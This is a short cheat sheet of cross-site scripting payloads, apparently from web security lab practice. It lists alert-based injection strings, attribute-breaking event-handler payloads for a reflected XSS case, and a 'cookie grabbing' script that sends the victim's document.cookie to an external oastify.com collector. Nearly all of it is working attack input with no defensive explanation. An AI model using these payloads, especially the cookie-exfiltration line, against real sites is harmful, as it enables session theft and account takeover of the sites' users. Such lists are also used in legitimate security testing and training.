#### For testing.
```js
<script>alert(1337)</script>
<svg/ onload=alert(1337)//
<script onclick="alert(1337)">
" onclick="alert(1337)
" autofocus="alert(1337)
"onmouseover="alert(1)
">cyborg71<script>alert(1337)</script> >> DOM XSS in document.write sink using source location.search
<img src=x onerror=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt;
```
### Reflected XSS into attribute with angle brackets HTML-encoded
```js
" onclick="alert(1337)
" autofocus="alert(1337)
" autofocus onfocus="alert(1337)
"onmouseover="alert(1)
```
#### For cookie grabbing.
```js
<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
```
